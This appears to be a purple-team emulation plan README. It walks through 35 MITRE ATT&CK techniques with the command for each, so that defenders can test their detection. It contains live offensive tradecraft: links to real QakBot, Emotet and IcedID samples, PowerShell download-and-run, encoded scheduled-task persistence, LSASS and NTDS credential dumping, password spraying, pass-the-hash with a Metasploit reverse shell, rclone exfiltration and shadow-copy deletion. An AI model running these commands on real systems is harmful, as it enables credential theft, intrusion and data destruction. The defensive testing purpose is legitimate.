# Context and Goal
When I first created this emulation plan, I wanted something reprensentative of what most organizations are likely to face, hence having a top MITRE techniques.
This more a simulation plan than real emulation of a threat as it is a combination of the most used techniques by various adversaries. Intel has been gathered through different public intel reports.
My goal is to enable more organizations to be able to Purple Team. So cancel that internal web app that you wanted to pentest and give this emulation plan to the pentester. Make him/her sit with your Blue Team.

In order to onboard as much organization as we can into the adversary emulation world, I tried to avoid using C2 as much as possible.
For more mature organizations, you might therefore enrich this plan with a bit more C2 flavor to make it more realistic.
However, this is a very good start for any organization to test their defenses against typical TTPs. And it doesn't require a strong mature red team infra.

Now keep in mind that the goal is not to detect 100% of the tested techniques. Preventing or detecting one of this technique is already a win for the Blue Team. The idea of catching one of the many steps performed by an attacker along the killchain is still a valid concept.
For some techniques, it will definitely makes sense to invest effort into hardening to prevent it or invest into detection engineering to detect it. For other you might only need to ensure that you can get the right telemetry. A trade-off is to be found. 

# How to tips
- Use the spreadsheet and this repository's resource to lead the purple team exercise. Plan the exercise with your sysadmin/network team, why not invite them around the table to strenghten collaboration? 
- By default the spreadsheet offers 2 lines to document security controls for each technique. If you have identified (pre or post execution) more than 2 security controls, just add a new line in between.
- The most realistic simulation/emulation should occur on a production environment. 
- For the endpoint tests, try first with all security enabled (AV, EDR, FW, etc.). If the technique is blocked, this is great! Document and retest with the security disabled to see what's your position on the telemetry for that technique. We all have that workstation where the AV/EDR is struggling to work properly, could you at least detect it if this one was targeted?

# Procedures

To ease the reading, I've extracted each procedure's step below and added few comments.

### Step 1 - Reconnaissance: n/a

Not covered

### Step 2 - Resource Development: T1608.006 Stage Capabilities: SEO Poisoning

Not covered but most software recently SEO-poisoned could be found here:
https://github.com/Sam0x90/CTI/blob/main/ATT%26CK/Techniques/T1608_Stage_Capabilities/T1608.006_SEO_Poisoning/SEO_poisoned_software.txt

### Step 3 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0650 QakBot

1. Download sample file here: https://bazaar.abuse.ch/sample/27bb0a8c1d9f9e7eaee26a97bd01f377c1f3048b881107021f60f7804410ebe8/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 4 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

1. Download sample file here: https://bazaar.abuse.ch/sample/9f8b5f5da718fafb98de9b2128cd81fd720a37de6c755b81965ead358aeb912a/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 5 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0483 IcedID

1. Download sample file here: https://bazaar.abuse.ch/sample/26ea40677a90116aeb5a0d8aba85ce66edd4669573decafac12f5ed089668216/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 6 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

1. Download sample file here: https://bazaar.abuse.ch/sample/9ba1b1bf9bccdf3cdd0e07616da28acea278e70f77dce249bc821c552a846aa8/
2. Prepare email with attachment and a controlled mailbox for simulation (to avoid infection)
3. Send email

### Step 7 - Initial Access: T1566.002 Phishing: Spearphishing Link

1. Pick a phishing URL from PhishTank or ThreatFox database
2. Prepare email with link and a controlled mailbox as recipient for simulation (to avoid leaking information)
3. Send email

### Step 8 - Execution: T1204.002 User Exectution: Malicious File

1. Create PE file with extension .exe in C:\Users\Public
2. Create DLL file with extension .dll in C:\Users\Public
3. Create PE file with extension .dat in C:\Users\Public

### Step 9 - Execution: T1059.001 Powershell

1. Download test LNK here: https://github.com/Sam0x90/CTI/blob/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/atomic.lnk
2. Double click the lnk

This LNK will run the following powershell command line:

```
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGEAbQAwAHgAOQAwAC8AQwBUAEkALwByAGEAdwAvAG0AYQBpAG4ALwBBAGQAdgBlAHIAcwBhAHIAeQAlADIAMABFAG0AdQBsAGEAdABpAG8AbgAlADIAMABQAGwAYQBuAHMALwAyADAAMgAyAF8AVABvAHAAMwA1AF8ATQBpAHQAcgBlAC8AYwBhAGwAYwAuAGUAeABlACIAOwAkAHAAYQB0AGgAPQAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYwBhAGwAYwAuAGUAeABlACIAOwBpAHcAcgAgAC0AdQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==
```

This is the decoded command, which will download a legit Windows calc.exe from this repository before running it: 

```
$url="https://github.com/Sam0x90/CTI/raw/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/calc.exe";$path="C:\Users\Public\calc.exe";iwr -uri $url -OutFile $path;Start-Process -FilePath $path
```

### Step 10 - Execution/Discovery: T1059.001 Powershell & T1135 Network Share Discovery

Using Powerview, here is procedure example:

```
Invoke-ShareFinder -CheckShareAccess - Verbose | Out-File -Encoding ascii C:\ProgramData\shares.txt
```

### Step 11 - Execution/Discovery: T1059.001 Powershell

Using Powerview recon script to execute several discovery commands such as:

```
Get-NetLocalGroup
Get-NetLocalGroupMember
Get-NetShare
Get-NetDomain
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
Get-DomainSID
Get-DomainTrust
Get-DomainGPO
Get-DomainPolicy
```

### Step 12 - Execution/Discovery: T1047 Windows Management Instrumentation & T1518 Software Discovery

```
wmic product get name,version
```

### Step 13 - Execution/Discovery: T1047 Windows Management Instrumentation & T1082 System Information Discovery

```
wmic computersystem get domain
```

### Step 14 - Execution/Persistence: T1047 Windows Management Instrumentation & T1546.003 Event Triggered Execution: WMI Event Subscription

1. Copy the script "cmd_fileping.vbs" in C:\temp\ folder
2. Copy and run as admin the script wmi_event_sub.ps1
3. Open a notepad.exe
4. Copy and run as admin the script wmi_sub_remove.ps1 to clean up the WMI subscription.

### Step 15 - Execution/Lateral Movement: T1047 Windows Management Instrumentation & T1021.006 Remote Services: Windows Remote Management

```
wmic /node:IP process call create "cmd.exe /c start C:\windows\system32\calc.exe"
```

### Step 16 - Persistence: T1053.005 Scheduled Task

```
schtasks.exe /Create /F /TN "{GUID}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz))) " /SC MINUTE /MO 30
```

### Step 17 - Persistence: T1547.001 Registry Run Keys / Stratup Folder

```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Startup" /t REG_EXPAND_SZ /d "C:\temp" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Run" /v "PurpleCalc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

### Step 18 - Privilege Escalation/Defense Evasion: T1055.001 Process Injection: Dynamic-link Library Injection & S0154 Cobalt Strike

1. Download benin reflective DLL for injection testing at: https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/bin/reflective_dll.x64.dll
2. Requires a meterpreter session
3. In msfconsole run the following commands:
```
use post/windows/manage/reflective_dll_inject
set PATH <PATH_TO_DOWNLOADED_DLL>
set PID <TARGET_PID>
set SESSION <SESSION_ID>
run
```

### Step 19 - Privilege Escalation/Defense Evasion: T1055.012 Process Injection: Process Hollowing



### Step 20 - Defense Evasion: T1218.010 System Binary Proxy Execution: Regsvr32

Because regsvr32 is used to register or unregister an OLE object, the DLL needs and will executes by default an export function named DllRegisterServer.
1. Download this harmless DLL from RedCanary github: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll
2. Execute:
```
regsvr32.exe /s .\Downloads\AllTheThingsx86.dll
```

This DLL was part of an open source project that no longer exists but the DLL is harmless and has been built to be loaded in various ways such as DllRegisterServer function. Upon execution the function DllRegisterServer will execute calc.exe. You should therefore see a calculator pops up on the screen. Alternatively you can remove the "/s" argument (silent) to get a confirmation (or error) message about the execution, though attackers usually use the "/s" argument to avoid tipping off potential user. 

### Step 21 - Defense Evasion: T1218.011 System Binary Proxy Execution: Rundll32

Calling export function name with arguments
```
rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""
```

Calling export function by ordinal with arguments
```
rundll32 ""advpack.dll,#12"" ""cmd.exe /c calc.exe""
```

Calling export function by negative ordinal number with args
```
rundll32 ""advpack.dll,#-4294967284"" ""cmd.exe /c calc.exe""
```

### Step 22 - Credential Access: T1003.001 OS Credential Dumping: LSASS Memory & S0002 Mimikatz & S0349 Lazagne

1. Dump LSASS Memory using comsvcs.dll by running the following command in an elevated command prompt:
  1.1
   ```
   rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full
   ```
2. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
   ```
   mimikatz.exe
   privilege::debug
   sekurlsa::logonpasswords
   ```

3. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
   ```
   Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>
   ```
4. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
   ```
   lazagne.exe all -oN -output C:\Users\purple
   ```
5. Execute the same procedure as 4 but with a renamed binary 
   ```
   ls.exe all -oN -output C:\Users\purple
   ```

### Step 23 - Credential Access: T1003.003 OS Credential Dumping: NTDS

1. Dump NTDS with ntdsutil by running the following in a command prompt on DC:
   ```
   ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q
   ```

3. Dump NTDS using secretsdump.py downloaded at: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
   2.1 Normal execution with replication service
   ```
   python3 secretsdump.py -just-dc domain/user@DChostname
   ```
   
   2.2 Execution using VSS
   ```
   python3 secretsdump.py -just-dc domain/user@DC hostname -use-vss
   ```

### Step 24 - Credential Access: T1110.003 Brute force: Password Spraying

Download password spray script at https://github.com/dafthack/DomainPasswordSpray and run the following:
```
Import-Module .\domainpasswordspary.ps1; Invoke-DomainPasswordSpray -UserList .\users.txt -domain domain.local -PasswordList passwords.txt -OutFile creds.txt
```

### Step 25 - Discovery: T1482 Domain Trust Discovery & T1018 Remote System Discovery & T1016 System Network Configuration Discovery & T1082 System Information Discovery

Run the following discovery commands:
```
ipconfig /all
net view /all
systeminfo
ping -n 1 <IP>
nltest /dclist:
nltest /domain_trusts
nltest /domain_trust /all_trusts
net group "Domain Administrators" /domain
route print
nslookup -querytype=ALL -timeout=10
cmd /c set
netstat -nao
net localgroup
```

### Step 26 - Discovery: T1087.002 Account Discovery: Domain Account & T1018 Remote System Discovery & S0552 AdFind

```
adfind.exe
```

renamed_adfind.exe

```
adfind -f (objectcategory=person) > ad_users.txt
adfind -f objectcategory=computer > ad_computers.txt
```

### Step 27 - Lateral Movement: T1021.001 Remote Services: Remote Desktop Protocol

Use mstsc.exe to login into a remote computer of your choice

### Step 28 - Lateral Movement: T1021.002 Remote Services: SMB/Windows Admin Shares

Download psexec from official source:  https://learn.microsoft.com/en-us/sysinternals/downloads/psexec and run the following command:
```
psexec.exe  \\<IP ADDRESS> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner C:\windows\system32\calc.exe
```

### Step 29 - Lateral Movement: T1550.002 Use Alternate Authentication Material: Pass the Hash

Metasploit - PSexec module
1. Get a meterpreter session
2. Run the following commands
```
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBDomain <TARGET_DOMAIN>
set SMBUser <TARGET_USER
set SMBPass <LMHASH>:<NTHASH>
set SMBSHARE ADMIN$
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKING_IP>
set LPORT <LISTENING_PORT
exploit
```

PSExec
1. Using the NTLM hash from previous Mimikatz test
2. Run the following mimikatz command 
```
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH>
```
4. In the new cmd windows opened, run the following psexec command:
   ```
   psexec \\<IP> cmd.exe
   ```

### Step 30 - Collection: T1560.001 Archive Collected Data: Archive via Utility & S0160 certutil

Usage of certutil and 7z using the following command lines:
```
certutil -encode inputFile outputFile
C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp
```

### Step 31 - Command and Control: T1219 Remote Access Software

Those tools usually have a free version but it requires to sign up with an account. Sign up, download from the official website and sign-in to be able to remotely access.
1. AnyDesk
2. Splashtop Remote/Streamer
3. Atera RMM
4. TeamViewer

### Step 32 - Command and Control: T1071 Application Layer Protocol

1. Download flightsim from: https://github.com/alphasoc/flightsim/releases
2. Follow installation procedure depending on package downloaded.
3. Run the following commands to simulate C2 traffic:
```
flightsim run c2:trickbot
flightsim run c2:bumblebee
flightsim run ""c2:raccoon stealer""
flightsim run ""c2:redline stealer""
flightsim run ""c2:respberry robin""
flightsim run ""c2:raccoon stealer""
flightsim run ""c2:remcos rat""
```

Alternatively, run the following command to retrieve the list of all c2 families available for you to test:
```
flightsim get c2:families
```

### Step 33 - Exfiltration: T1567 Exfiltration Over Web Service: Exfiltration to Cloud Storage & S1040 Rclone

```
rclone.exe copy ''\\server\path" mega:folder -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
```

### Step 34 - Impact: T1490 Inhibit System Recovery

```
vssadmin delete shadows /all /quiet
```

### Step 35 - Impact: T1490 Inhibit System Recovery

```
wmic shadowcopy delete
```


# TO-DO:
- Scoring and/or reporting to evaluate/benchmark. 






